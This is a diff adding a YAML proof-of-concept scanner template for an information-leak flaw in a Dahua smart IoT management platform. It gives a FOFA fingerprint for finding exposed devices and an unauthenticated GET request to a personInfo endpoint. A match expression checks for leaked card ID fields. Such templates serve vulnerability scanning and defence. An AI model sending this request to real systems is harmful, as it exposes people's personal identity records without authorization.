@@ -1,0 +1,19 @@
+id: poc-yaml-dahua-evo-face-personinfo-infoleak
+info:
+  name: 大华智能物联综合管理平台 /personInfo/page 信息泄露漏洞
+  severity: medium
+  tags:
+  - 两高一弱
+  - 信息泄露
+  finger: 大华智慧园区综合管理平台
+  fofa: icon_hash="-1935899595"body="*客户端会小于800*"
+requests:
+- method: GET
+  path: /evo-apigw/evo-face/personInfo/page
+  headers:
+    Range: bytes=0-5000
+  expression: "status_code == 200 && \ncontains(body,\"\\\"success\\\"\") && \ncontains(body,\"\
+    \\\"pageData\\\"\") &&\ncontains(body,\"\\\"cardtypeStr\\\"\") &&\ncontains(body,\"\
+    \\\"cardid\\\"\")\n"
+variables: {}
+transport: http
